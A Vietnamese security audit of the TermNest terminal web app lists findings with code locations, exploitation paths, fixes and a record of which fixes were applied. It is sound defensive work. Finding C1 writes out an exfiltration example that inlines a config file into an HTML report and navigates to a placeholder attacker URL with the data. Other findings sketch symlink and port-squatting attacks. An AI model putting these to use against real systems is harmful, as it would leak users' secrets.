# 48 - Báo cáo rà soát bảo mật TermNest (chỉ đọc)

Phiên bản rà soát: 1.1.18 (server.js, lib/*, lib/features/*, public/*, desktop/). Ngày: 2026-11-14.
Phương pháp: đọc mã toàn bộ các bề mặt được yêu cầu, `npm audit --omit=dev`, và kiểm tra động trên server tạm
(`TW_DATA` tạm, cổng tạm, `TW_TMUX_SOCKET` riêng nên không chạm tmux hay dữ liệu thật; đã dừng server và xóa dữ liệu tạm).
Không sửa file nguồn nào. Không in bí mật nào. Mức "đã xác nhận động" nghĩa là đã chạy thử; còn lại là suy luận từ mã (ghi rõ).

## Tổng kết

| Mức | Số lượng |
|---|---|
| Cao | 1 |
| Trung bình | 8 |
| Thấp | 9 |
| Ghi chú/Info | 5 |

Top 5 cần xử lý trước:
1. C1 - Báo cáo HTML mở trong khung xem có thể đọc file anh em trong thư mục phiên rồi đẩy ra ngoài (inline script từ file + khung sandbox vẫn tự điều hướng được).
2. M1 - Khóa đăng nhập toàn cục 5 lần/60 giây: bất kỳ tiến trình cục bộ nào cũng khóa được chủ máy (đã xác nhận động).
3. M2 - Desktop: cổng cố định 7681 + "nhận dạng" `/__app` giả được, trang chiếm cổng nhận quyền IPC (đọc clipboard, lưu file, mở link).
4. M3 - SSH tin-lần-đầu (TOFU) im lặng; luồng `newkey`/mật khẩu gửi mật khẩu tới máy chưa xác minh dấu vân tay.
5. M4 - Vault dùng scrypt N=2^15, bản sao lưu (kể cả lên Drive/Dropbox) vẫn mở được bằng mật khẩu CŨ sau khi đổi mật khẩu.

---

## CAO

### C1. Báo cáo HTML đọc được file khác trong thư mục phiên và đẩy ra ngoài
- Vị trí: `lib/html-assets.js:54,69-77` (inline `<script src>` từ file), `lib/file-viewer.js:20` (danh sách đuôi được đọc), `server.js:806-818` (CSP của `/api/file-preview`), `public/file-viewer.js:77` (iframe `sandbox="allow-scripts"`).
- Cách khai thác (suy luận từ mã, chưa chạy PoC trình duyệt): kho mã lạ đã clone, hoặc AI bị prompt-injection, ghi `report.html` có `<script type="application/json" src="../appsettings.json"></script>`. Người dùng bấm link báo cáo trong terminal (tính năng chính của viewer). `inlineAssets` đọc file đó qua trình đọc có chứa trong thư mục phiên (đuôi cho phép: json, yaml, log, conf, ini, toml, sql, py, cs, md, txt...) rồi nhúng thành văn bản inline trong trang. Script của trang đọc `textContent` rồi tự điều hướng khung: `location.href='https://kẻ-tấn-công/?'+dữ_liệu`. CSP `default-src 'none'` chặn fetch/img/form nhưng KHÔNG chặn điều hướng của chính tài liệu (`navigate-to` đã bị bỏ khỏi chuẩn), và `sandbox` không có `allow-top-navigation` chỉ chặn điều hướng khung cha, không chặn khung tự điều hướng. Đích đến thực tế: cấu hình có mật khẩu DB, token trong file `*.json/*.yaml/*.log` của dự án.
- Hậu quả: lộ bí mật trong cây thư mục phiên (không thoát khỏi thư mục phiên, nhưng thư mục phiên thường là cả workspace).
- Cách sửa cụ thể:
  1. Chỉ inline script có đuôi `.js/.mjs` và stylesheet `.css`, ảnh theo magic (không đọc `.json/.yaml/.log/.sql...` qua đường script).
  2. Khung xem báo cáo: thêm cảnh báo "báo cáo này chạy mã; có thể gửi dữ liệu ra ngoài" và cho tắt script (mặc định chỉ hiện tĩnh, bật script khi người dùng bấm).
  3. Chặn điều hướng khung: trong `injectReportLinks` thêm `<meta http-equiv="Content-Security-Policy" content="...">` không đủ; thay bằng chạy báo cáo trong iframe `sandbox` có thêm `csp` attribute và dùng `Navigation API` chặn `navigate` (`navigation.addEventListener('navigate', e => e.preventDefault())` được tiêm làm script đầu tiên) kết hợp (1) - hoặc bỏ hẳn script của báo cáo.
  4. Từ chối đọc dotfile và tên nhạy cảm (`appsettings*.json`, `secrets*`, `*.pem`, `.env*`) trong `fileRuntime`.
- Đã làm tốt liên quan: sandbox không có `allow-same-origin` (origin mờ), `connect-src` bị chặn, `form-action 'none'`, `postMessage` về cha được kiểm `e.source === frame.contentWindow` (public/file-viewer.js:478).

---

## TRUNG BÌNH

### M1. Khóa đăng nhập toàn cục tạo DoS cục bộ
- Vị trí: `server.js:40-41,355-362`.
- Đã xác nhận động: 5 mật khẩu sai liên tiếp từ curl thì request thứ 6 (kể cả mật khẩu đúng) nhận 429 trong 60 giây. Bộ đếm không theo IP/phiên, `Origin` rỗng được phép với curl.
- Khai thác: một tiến trình/người dùng cục bộ khác (hoặc script) cứ 60 giây gửi 5 lần sai để chủ máy không đăng nhập được; ngược lại giới hạn 5/phút vẫn cho dò 7200 mật khẩu/ngày.
- Sửa: khóa theo (địa chỉ nguồn + User-Agent/phiên trình duyệt) hoặc chỉ làm chậm tăng dần (exponential backoff) mà vẫn nhận mật khẩu đúng của phiên đã có cookie hợp lệ; ghi sự kiện ra log; yêu cầu mật khẩu >= 12 ký tự.
- Đã làm tốt: lỗi 401 không phân biệt tài khoản, `timingSafeEqual` cho token thiết lập, đếm reset khi đúng.

### M2. Desktop: cổng cố định và nhận dạng giả được, IPC cấp theo origin
- Vị trí: `desktop/src/main.rs:71-107` (`identity` chỉ kiểm `{"app":"tmux-dev"}`), `desktop/src/main.rs:522-534` (capability `remote("http://127.0.0.1:<port>/*")` với clipboard đọc/ghi, notification, `desktop-bridge`), cổng 7681 cố định (`main.rs:466-470`).
- Khai thác: tiến trình khác của cùng người dùng (hoặc người dùng khác trên máy chia sẻ) mở sẵn 127.0.0.1:7681 trả `/__app` giả. Desktop coi đó là "Termnest khác đang chạy" (nhánh "thắng cuộc đua bind") và mở cửa sổ tới trang giả với IPC: đọc clipboard (mật khẩu vừa copy), `save_export` ghi file qua hộp thoại, `open_external`.
- Sửa: sinh bí mật ngẫu nhiên mỗi lần chạy, truyền cho Node qua pipe thiết lập và bắt `/__app` trả HMAC của nonce do desktop gửi; hoặc dùng cổng ngẫu nhiên/Unix socket; hạn chế `clipboard-manager:allow-read-text` chỉ khi người dùng bấm.
- Đã làm tốt: `local(false)` và `.remote()` chỉ đúng origin, `on_navigation` chỉ cho origin của app, popup bị `Deny` rồi mở bằng `external()` chỉ http/https không kèm user:pass, `save_export` luôn qua hộp thoại, `desktop_stage` chỉ nhận nhãn cố định, bridge.js kiểm `location.origin` trước khi gắn.

### M3. SSH TOFU im lặng và gửi mật khẩu tới máy chưa xác minh
- Vị trí: `lib/remote.js:73-79` (lần đầu `cfg.fingerprint` rỗng thì tin luôn), `server.js:304-307` (`newkey`: đăng nhập bằng mật khẩu rồi cài khóa), `server.js:360-365`.
- Khai thác: người ở giữa (Wi-Fi, VPN lỗi, DNS) lúc thêm máy lần đầu nhận mật khẩu SSH, và với `newkey` còn nhận khóa mới do TermNest cài, tức duy trì quyền truy cập.
- Sửa: bước thêm máy hiển thị dấu vân tay SHA256 lấy được và bắt người dùng xác nhận (so với kênh khác) trước khi gửi mật khẩu; lưu loại khóa; có chức năng "xác nhận đổi khóa" có chủ đích thay vì chỉ "gỡ và thêm lại".
- Đã làm tốt: khi dấu vân tay ĐỔI thì từ chối kết nối (`hostKeyChanged`), mật khẩu SSH không lưu (chỉ trong RAM), khóa riêng nằm trong vault mã hóa, `shq` cho mọi lệnh gửi lên máy chủ.

### M4. Vault: KDF yếu hơn khuyến nghị, bản sao lưu không bị vô hiệu khi đổi mật khẩu
- Vị trí: `lib/vault.js:8` (scrypt N=2^15, r=8, p=1), `lib/vault.js:55-62,92-104` (bản sao lưu 10 cái cùng salt, có thể chép sang thư mục Drive/Dropbox), `scripts/set-password.js:28-37`, `lib/service-runtime.js` (tham số scrypt lặp lại).
- Khai thác: (a) bản sao lưu trên đám mây bị lấy thì bẻ mật khẩu ngoại tuyến nhanh hơn OWASP khuyến nghị (N=2^17); (b) sau khi `set-password` đổi mật khẩu, các file `backups/vault-*.json` cũ (và bản ở thư mục đám mây) vẫn mở được bằng mật khẩu cũ, chứa toàn bộ khóa SSH.
- Sửa: nâng N lên >= 2^17 (ghi tham số vào file để tương thích, `v:2`); khi đổi mật khẩu thì xóa/ghi đè mọi bản sao lưu cũ (cả thư mục phụ) hoặc mã hóa lại; mật khẩu tối thiểu 12 và kiểm tra khi lưu cả ở `/api/setup/restore`.
- Đã làm tốt: AES-256-GCM, IV 12 byte ngẫu nhiên mỗi lần seal, salt 16 byte ngẫu nhiên, ghi nguyên tử + fsync, file 0600 / thư mục 0700 (đã xác nhận động: `vault.json`, `backups/` đúng quyền), khóa chỉ giữ trong bộ nhớ, `check()` dùng `timingSafeEqual`, `TW_PASSWORD_FILE` bắt buộc file riêng tư không symlink/nlink=1 (rất chặt), không có đường "reset mật khẩu" vòng qua mã hóa.

### M5. Thư mục tạm `/tmp/termnest-drop-<uid>` dễ bị chiếm trước trên máy Linux dùng chung
- Vị trí: `lib/features/drop.js:38-40` (`mkdir -p "$d" && chmod 700 "$d"` không kiểm chủ sở hữu/symlink), `lib/features/browse.js` `tempRuntime` (đọc cùng thư mục), `lib/file-viewer.js` `readTempFile`.
- Khai thác: người dùng khác trên máy SSH tạo trước `/tmp/termnest-drop-1000` là symlink tới thư mục họ kiểm soát (hoặc thư mục của họ). `mkdir -p` đi theo symlink; file người dùng thả vào (có thể là tài liệu nhạy cảm) nằm trong thư mục kẻ tấn công, kẻ tấn công thay nội dung file giữa lúc ghi và lúc agent đọc (chèn lệnh/nội dung).
- Sửa: tạo bằng `mktemp -d`/kiểm `[ -d "$d" ] && [ ! -L "$d" ] && [ "$(stat -c %u "$d")" = "$(id -u)" ]` (macOS `stat -f %u`), nếu sai thì từ chối; ưu tiên `$XDG_RUNTIME_DIR` (0700 do hệ thống tạo).

### M6. Đóng phiên/hết hạn không đóng terminal WebSocket đang mở
- Vị trí: `server.js:794-796` (logout chỉ xóa cookie), `server.js:1013-1040` (`openTerms` giữ nguyên), `server.js:73,238` (phiên 12 giờ tuyệt đối, bản đồ `sessions` không dọn mục hết hạn).
- Khai thác: đăng xuất hoặc hết 12 giờ nhưng terminal (có quyền thực thi lệnh) vẫn tương tác được cho tới khi tab đóng; máy dùng chung/trình duyệt để mở.
- Sửa: lưu token trên mỗi `ws`, khi logout/hết hạn/`vault` khóa thì `ws.terminate()`; kiểm lại `authed` định kỳ trong vòng ping 30 giây; dọn `sessions` hết hạn theo timer.
- Đã làm tốt: nâng cấp WS yêu cầu `Host` hợp lệ + `Origin` bắt buộc và đúng + cookie hợp lệ (đã xác nhận động: Origin lạ và không Origin đều 403), `maxPayload` 1 MiB, token phiên 256 bit.

### M7. Phụ thuộc `ws@8.18.0` dính 2 advisory mức High
- Nguồn: `npm audit --omit=dev` (đã chạy): GHSA-58qx-3vcg-4xpx (lộ bộ nhớ chưa khởi tạo) và GHSA-96hv-2xvq-fx4p (cạn bộ nhớ do phân mảnh nhỏ), sửa ở 8.23.0.
- Mức thực tế: sau xác thực và chỉ nghe 127.0.0.1 nên khai thác hạn chế (DoS từ phiên đã đăng nhập hoặc trang cùng máy đã qua kiểm Origin); đánh Trung bình vì sửa rẻ.
- Sửa: nâng `ws` lên >= 8.23.0 (cần nới `package.json`, hiện ghim `8.18.0`), chạy `node --test`. Các gói khác: `ssh2@1.16.0`, `markdown-it@14.3.3`, `node-pty@1.1.0` không có advisory trong audit; cũng cần `cargo audit` cho `desktop/Cargo.lock` (chưa chạy được ở rà soát này).

### M8. Chuỗi cung ứng bản cài/cập nhật: không chữ ký
- Vị trí: `desktop/tauri.conf.json:31-32` (`signingIdentity: "-"`, `hardenedRuntime: false`: ký ad-hoc, không notarize), `scripts/package-update.js` (SHA256SUMS nằm TRONG cùng archive), `docs/supervisor.md:40-92` (cập nhật thủ công bằng giải nén tar).
- Hậu quả: người dùng bị dẫn vào bỏ qua Gatekeeper; bản cập nhật bị thay thế hoàn toàn (kể cả SHA256SUMS) không bị phát hiện. Không có plugin updater tự động nên không có luồng tải ngầm (tốt), nhưng cũng không có xác minh chữ ký.
- Sửa: ký Developer ID + notarize + `hardenedRuntime: true`; ký archive cập nhật (minisign/cosign) và công bố khóa công khai riêng kênh; `package-update` in dấu vân tay kỳ vọng.
- Đã làm tốt: `package-update.js` từ chối symlink, nhị phân native, file lạ, loại trừ `data/vault/credentials/implementation`; kiểm giải nén trước khi đổi tên.

---

## THẤP

### L1. Cookie thiếu `Secure`/tiền tố `__Host-` khi chạy sau proxy HTTPS
`server.js:347-349,795`. Khi người dùng đặt `TW_ALLOWED_HOSTS` và qua reverse proxy TLS, cookie có thể bị gửi lại qua HTTP. Sửa: thêm `Secure` khi `X-Forwarded-Proto: https` hoặc có cờ cấu hình; cân nhắc tên `__Host-tw_sid`. Đã tốt: `HttpOnly; SameSite=Strict; Path=/`.

### L2. `crash.log` ghi stack trace, quyền theo umask
`lib/crash-guard.js:21` (`appendFileSync` mặc định 0666&~umask; `mkdirSync` không `mode`). Nằm trong thư mục dữ liệu 0700 nên thực tế an toàn trên POSIX; stack lỗi ssh2/fetch có thể chứa host, user, đường dẫn. Sửa: `{ mode: 0o600 }`, che host/user, và chỉ ghi `err.code` + dòng stack đầu cho lỗi mạng.

### L3. CSP còn rộng
`server.js:146`: `style-src 'unsafe-inline'`; `connect-src ws://127.0.0.1:*` cho mọi cổng cục bộ và `ipc:`/`http://ipc.localhost` cả trong trình duyệt; thiếu `Permissions-Policy`, COOP/CORP. Sửa: giới hạn `ws://127.0.0.1:<PORT>` đúng cổng; chỉ thêm `ipc:` khi chạy bản desktop. Đã tốt: không có `unsafe-eval`/script inline, `frame-ancestors 'none'`, `base-uri 'none'`, `form-action 'none'`, `X-Content-Type-Options`, `Referrer-Policy: no-referrer`, `Cache-Control: no-store` cho API (đã xác nhận động).

### L4. Đọc body rất lớn trước khi kiểm xác thực token ở thiết lập web
`server.js:754` (`/api/backup/restore`, đã đăng nhập) và `server.js:862` (`/api/setup/restore`, chỉ khi `TW_SETUP_TOKEN` đang bật): `readJson(req, 400 MiB)` đọc toàn bộ vào RAM; ở `setup/restore` token chỉ so SAU khi đọc. Sửa: kiểm token từ header trước khi đọc, giảm trần hoặc stream.

### L5. `move-files` chỉ kiểm đường dẫn theo chuỗi, tin máy nguồn
`lib/move-files.js:60-120` (`path.resolve(root, rel).startsWith(root+sep)`, không `realpath` cha, `tmp` có tên đoán được `.termnest-<pid>`). Máy nguồn bị chiếm có thể ghi file vào thư mục hội thoại của máy đích (nội dung hội thoại để prompt-injection) hoặc đi qua symlink có sẵn. Sửa: `realpath` thư mục cha và từ chối symlink, tạo tmp bằng `wx` + tên ngẫu nhiên.

### L6. `send-keys` thiếu `--` ở crewpanes
`lib/features/crewpanes.js:24-27`: `tmux send-keys -t T -l <text>`; text bắt đầu bằng `-` (ví dụ `-X`) bị tmux hiểu là cờ. `lib/keys.js` đã dùng `--` đúng. Sửa: thêm `--`. Tác động thấp vì chỉ người dùng đã đăng nhập gọi.

### L7. Môi trường của server chảy xuống terminal con
`lib/local.js:132`: `env: { ...process.env }` mang cả `TW_PASSWORD_FILE`, `TW_DATA`, `TW_SETUP_TOKEN` (trước lúc xóa) và mọi biến bí mật khác vào shell/agent chạy cục bộ. Sửa: lọc bỏ tiền tố `TW_*` (trừ `TW_TMUX_SOCKET` cần thiết).

### L8. Forge/webhook: đích tùy ý, có thể HTTP
`lib/forge.js:18-23` (`cleanUrl` nhận `http:` và mọi host kể cả loopback/dải riêng), `lib/features/forge.js:20-32` (PAT gửi qua http không mã hóa; JSON trả về trang qua `/gitlab`), `lib/features/opshub.js:267-270` (webhook HTTPS bất kỳ, `fetch` mặc định theo redirect). Cần phiên đã đăng nhập mới khai thác (SSRF trong LAN). Sửa: yêu cầu `https:` (cho phép http chỉ với cờ rõ), chặn dải loopback/link-local/RFC1918 trừ khi xác nhận, `redirect: 'manual'` cho webhook. Đã tốt: forge chỉ theo redirect cùng origin (`redirect:'manual'`, `forge.js:27`), PAT che còn 4 ký tự cuối, không bao giờ trả token về trang, đường dẫn `/gitlab` chặn bằng regex chặt; token Telegram/URL webhook chỉ nằm trong vault, `publicNotify` che, thông báo lỗi chỉ ghi mã `notify_http_<status>`.

### L9. Trình xem file đọc rộng khi thư mục phiên là `/` hoặc `$HOME`
`lib/file-viewer.js:20` (whitelist đuôi gồm json, conf, log, sh...). Ràng buộc "trong thư mục phiên" đúng (realpath, `O_NOFOLLOW`, regular file, 5 MB), nhưng nếu panel `cd` lên thư mục cao thì cả cây đọc được qua link in trong terminal. Sửa: danh sách từ chối cứng cho `~/.ssh`, `~/.aws`, `~/.config/*/credentials*`, `*/.env*`.

---

## GHI CHÚ / INFO

- I1. `/api/status` và `/__app` (không xác thực) tiết lộ trạng thái thiết lập và `active_work` (`server.js:974`). Chấp nhận được vì cần cho desktop.
- I2. Nhật ký crew (`/crew-log`, `/logs` ở `lib/features/crew.js:140-193`) trả văn bản log thô, không che bí mật (opshub có `SECRET` mask, crew thì không); `logCache` giữ trong RAM. `lib/crew.js` kiểm `readlink -f` rồi `tail` nên có cửa sổ TOCTOU nhỏ nếu kẻ tấn công cùng host đổi symlink giữa hai bước. Sửa: áp cùng bộ che `SECRET` của opshub khi trả ra trang.
- I3. `/api/features/server-backup/download-ticket/*` bỏ qua cookie nhưng là vé 256 bit dùng một lần, TTL 2 phút, chỉ lưu băm, kiểm `Origin`/`Sec-Fetch-Site`, CSP `default-src 'none'` (`lib/server-backup-download.js`): thiết kế tốt (đã xác nhận động: token giả 404).
- I4. `public/ui-zoom.js` chỉ nhận giá trị trong `[70,80,90,100]` từ `localStorage` và chỉ `setProperty('--ui-z')`: không có đường chèn. Bản vá xterm ở `server.js:1004-1005` là `String.replace` trên nội dung vendor lúc phục vụ (không dữ liệu người dùng, thất bại thì không vá chứ không vỡ; đã xác nhận chuỗi mục tiêu xuất hiện đúng 1 lần trong xterm 5.5.0). Nhược: không có SRI/băm cho bản đã vá; nâng cấp xterm có thể làm bản vá im lặng mất tác dụng (chỉ lỗi UI, không phải bảo mật).
- I5. Tuyến log crew gộp mới (`batchLogScript`, `lib/crew.js:78-110`) an toàn: `task`/`track` qua regex `COMPONENT`, `nonce` hex 16-64 ký tự do server sinh nên nội dung log không giả được bản ghi, `cwd` qua `shq` + `readlink -f`, bỏ qua symlink/`prompt-*`/`devdb.log`, giới hạn 60 mục và 64 KB mỗi log; route `/logs` kiểm `COMPONENT` và đối chiếu với danh sách track đã biết (`lib/features/crew.js:140-185`).

---

## Những phần đã làm tốt (tổng hợp)

- Lắng nghe cố định `127.0.0.1` (`server.js:35`, không có tùy chọn 0.0.0.0); `hostOk` chặn DNS rebinding (xác nhận động: `Host: evil.com` thì 403); `originOk` chặn POST/PUT/DELETE chéo trang (xác nhận 403) và WS bắt buộc Origin.
- Cookie `HttpOnly; SameSite=Strict`; API `no-store`; service worker `sw.js` không có handler `fetch` nên không cache dữ liệu đã xác thực.
- Tĩnh: danh sách cho phép tường minh (xác nhận `../` và `%2f` trả 404), `/api/quit` chỉ khi đóng gói, `/api/setup*` chỉ khi có token và chưa có vault.
- Chống chèn lệnh: mọi thứ gửi lên shell đều `shq`; tên phiên giới hạn `^[A-Za-z0-9_-]{1,32}$` khi tạo, `=name:` khi gọi tmux, host/user kiểm regex, môi trường tài khoản Claude qua regex chặt, `task/track` qua `COMPONENT`.
- Đường dẫn: `fileRuntime`/`browse`/`create`/`fsop` dùng `realpath` + kiểm chứa, `O_NOFOLLOW`, thùng rác nằm trong thư mục phiên và chỉ gỡ "slot" do TermNest tạo; upload chặn thực thi (`BLOCKED`), kiểm magic, thư mục tạm 0700 + file 0600, tên file do server sinh.
- Markdown: `html:false`, chặn `javascript:`/`data:`, link `rel=noopener`; ảnh ngoài bị CSP `img-src 'self' data:` chặn; không có `innerHTML` với dữ liệu từ xa (tên phiên, tiêu đề, file, ghi chú, log đều qua `textContent`/`el()`; các `innerHTML` còn lại chỉ chèn SVG/thú cưng tĩnh).
- Desktop: IPC cấp theo origin, allowlist điều hướng, mở link ngoài chỉ http/https, hộp thoại lưu bắt buộc.
- Token AI: `redirect:'error'`, không trả giá trị thô (`lib/token-source.js`).

## Chưa kiểm tra / giới hạn
- Chưa chạy PoC trình duyệt cho C1 (kết luận từ mã và đặc tả CSP/sandbox).
- Chưa chạy `cargo audit` cho `desktop/Cargo.lock`; chưa kiểm tra hành vi điều hướng khung con của WKWebView/WebView2 trong Tauri (liên quan tới C1 trên desktop).
- Không kiểm thử trên máy chủ SSH thật nên M3/M5 dựa trên mã.

---

## Đã xử lý (phiên sửa lỗi, 2026-11-14)

- C1: `lib/html-assets.js` chỉ inline `<script src>` đuôi `.js/.mjs` và `<link>` đuôi `.css`, từ chối dotfile/`appsettings*`/`secrets*`/khóa; `lib/report-links.js` tiêm khóa điều hướng (Navigation API `navigate` -> preventDefault) ngay sau `<head>`/doctype và bỏ `<meta http-equiv=refresh>`; CSP `/api/file-preview` thêm `connect-src/frame-src/object-src/font-src/media-src/worker-src 'none'` (đã có `default-src 'none'`, `form-action 'none'`, sandbox không `allow-top-navigation`). Nguồn dữ liệu để đẩy ra ngoài (file json/yaml/log) không còn đi vào trang.
- M1: khóa đăng nhập theo từng client (địa chỉ + User-Agent), vẫn 5 lần/60 giây; chủ máy ở client khác không bị khóa (test tích hợp), có log khi khóa.
- M5 (và L2 của báo cáo 49): thư mục `termnest-drop-<uid>` tạo bằng `mkdir -m 700`, từ chối symlink/không phải thư mục/không đúng chủ sở hữu.
- M6: đăng xuất, phiên hết hạn hoặc mất phiên thì `ws.terminate()` mọi terminal của phiên đó (kiểm mỗi 30 giây + dọn `sessions` hết hạn).
- M7: `ws` 8.18.0 -> 8.23.0 trong `package.json` + `package-lock.json` (chưa `npm install`, xem dưới).
- M3 (một phần): ghi log dấu vân tay khi lần đầu tin (TOFU); vẫn ghim `known_hosts`/dấu vân tay và vẫn từ chối khi đổi khóa. Chưa có UI xác nhận nên không thêm bước chặn.
- L1: thêm `Secure` cho cookie khi `X-Forwarded-Proto: https`. L2: `crash.log` mode 0600. L6: `send-keys -l --` ở crewpanes. L7: không chuyển `TW_PASSWORD_FILE/TW_SETUP_TOKEN/TW_OLD_PASSWORD/TW_NEW_PASSWORD` vào terminal con.

## Chưa xử lý + lý do

- M2 (desktop cổng 7681 + xác thực `/__app`): cần sửa `desktop/src/main.rs` và biên dịch lại shell (hợp đồng `api_version==10`, capability gắn theo origin), không kiểm chứng được trong phiên này; để lại cho đợt build desktop.
- M4 (KDF N=2^17): đổi tham số scrypt cần định dạng `v:2` và đồng bộ `service-runtime.js`, rủi ro tương thích vault/backup hiện có; phần "bản sao cũ mở được bằng mật khẩu cũ" đã xử lý ở `scripts/set-password.js` (xóa bản sao cũ sau khi đổi). Mật khẩu tối thiểu 12 chưa đổi (đổi luồng hiện có).
- M8 (ký/notarize): cần danh tính ký và hạ tầng phát hành.
- L3, L4, L5, L8, L9, I2: chưa làm (đụng nhiều luồng hoặc cần quyết định sản phẩm). Navigation API chưa có trên mọi WebView (WKWebView cũ): khi thiếu, lớp chặn dữ liệu (không inline file dữ liệu) vẫn là lớp bảo vệ chính.
- `node_modules` còn ws 8.18.0: cần `npm install` (test `package-update` "real extracted source archive" đỏ cho tới lúc đó vì kiểm pin ws).
